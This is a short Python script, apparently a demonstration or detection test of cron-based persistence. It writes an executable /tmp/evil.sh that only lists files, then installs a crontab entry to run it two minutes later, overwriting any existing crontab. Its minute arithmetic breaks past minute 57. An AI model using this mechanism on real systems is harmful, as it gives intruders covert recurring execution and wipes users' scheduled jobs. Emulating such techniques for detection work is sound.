from datetime import datetime
import subprocess
import os

time = datetime.now()
minutes = time.strftime("%M")
plus_two_minutes = str(int(minutes) + 2)
hour = time.strftime("%H")

def create_evil_script():
    with open('/tmp/evil.sh', 'w') as f:
        f.write('ls > evil.tmp\n')
    os.chmod('/tmp/evil.sh', 0o755)
        
def create_evil_cron(plus_two_minutes, hour):
    with open('/tmp/persistevil', 'w') as f:
        f.write('{} {} * * * /tmp/evil.sh\n'.format(plus_two_minutes, hour))

def schedule_evil_cron():
    subprocess.run(['crontab', '/tmp/persistevil'])
    
if __name__ == '__main__':
    create_evil_script()
    create_evil_cron(plus_two_minutes, hour)
    schedule_evil_cron()
